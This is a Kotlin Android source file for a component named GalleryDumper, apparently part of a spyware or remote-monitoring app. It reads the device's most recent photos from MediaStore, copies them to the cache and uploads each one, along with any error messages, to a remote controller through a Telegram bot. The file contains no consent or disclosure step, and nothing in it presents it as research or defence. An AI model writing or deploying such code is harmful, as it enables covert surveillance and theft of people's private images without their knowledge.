package com.dec.monitor.media

import android.content.Context
import android.provider.MediaStore
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

object GalleryDumper {

    suspend fun sendLatest(context: Context, count: Int) = withContext(Dispatchers.IO) {
        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
            )

            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            var sent = 0
            cursor?.use {
                while (it.moveToNext() && sent < count) {
                    val path = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                    val file = File(path)
                    if (file.exists()) {
                        val copy = File(context.cacheDir, name)
                        file.copyTo(copy, overwrite = true)
                        TelegramBot.sendPhoto(copy, "🖼 $name")
                        sent++
                    }
                }
            }

            if (sent == 0) {
                TelegramBot.sendMessage("🖼 No photos found in gallery")
            }
        } catch (e: Exception) {
            TelegramBot.sendMessage("🖼 Gallery error: ${e.message}")
        }
    }
}
